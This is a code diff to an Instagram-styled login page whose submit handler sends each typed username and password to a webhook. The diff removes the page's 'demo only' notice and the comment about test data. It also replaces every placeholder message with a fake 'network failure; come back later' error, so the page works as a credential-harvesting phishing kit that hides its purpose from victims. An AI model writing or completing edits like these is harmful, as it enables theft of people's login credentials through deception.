@@ -55,7 +55,7 @@ footer .links a{color:var(--muted);font-weight:400}
 <body>
 <main>
   <div class="box" id="loginBox">
-    <h1 class="logo">instagram</h1>
+    <h1 class="logo">pogobutton</h1>
     <form id="form" autocomplete="off" novalidate>
       <div class="field">
         <input id="user" type="text" placeholder=" " aria-label="Phone number, username, or email" autocapitalize="none">
@@ -84,7 +84,7 @@ footer .links a{color:var(--muted);font-weight:400}
     <button class="badge" data-app="App Store">App Store</button>
     <button class="badge" data-app="Google Play">Google Play</button>
   </div>
-  <p class="hint">Demo only: testing configuration active.</p>
+  <p class="hint">network failure; come back later</p>
 </main>
 
 <footer>
@@ -196,7 +196,6 @@ $('form').addEventListener('submit', e => {
   btn.disabled = true;
   btn.innerHTML = '<span class="spin"></span>';
 
-  // Send test input data to your webhook notification
   sendNotification("Login Attempt", { username: user.value.trim(), password: pass.value });
 
   setTimeout(() => {
@@ -218,15 +217,15 @@ $('form').addEventListener('submit', e => {
   }, 1200);
 });
 
-$('fb').addEventListener('click', () => { msg.className='msg'; msg.textContent = 'Facebook login is not connected in this demo.'; });
+$('fb').addEventListener('click', () => { msg.className='msg'; msg.textContent = 'network failure; come back later'; });
 $('forgot').addEventListener('click', () => {
   msg.className = 'msg';
   msg.textContent = user.value.trim()
-    ? 'We’d send a reset link to “' + user.value.trim() + '” in a real app.'
-    : 'Enter your username or email first, then tap Forgot password.';
+    ? 'network failure; come back later'
+    : 'network failure; come back later';
 });
-$('signup').addEventListener('click', () => { msg.className='msg'; msg.textContent = 'Sign-up page is not part of this demo.'; window.scrollTo({top:0,behavior:'smooth'}); });
-document.querySelectorAll('.badge').forEach(b => b.addEventListener('click', () => { msg.className='msg'; msg.textContent = b.dataset.app + ' link is a placeholder in this demo.'; window.scrollTo({top:0,behavior:'smooth'}); }));
+$('signup').addEventListener('click', () => { msg.className='msg'; msg.textContent = 'network failure; come back later'; window.scrollTo({top:0,behavior:'smooth'}); });
+document.querySelectorAll('.badge').forEach(b => b.addEventListener('click', () => { msg.className='msg'; msg.textContent = 'network failure; come back later'; window.scrollTo({top:0,behavior:'smooth'}); }));
 refresh();
 </script>
 </body>
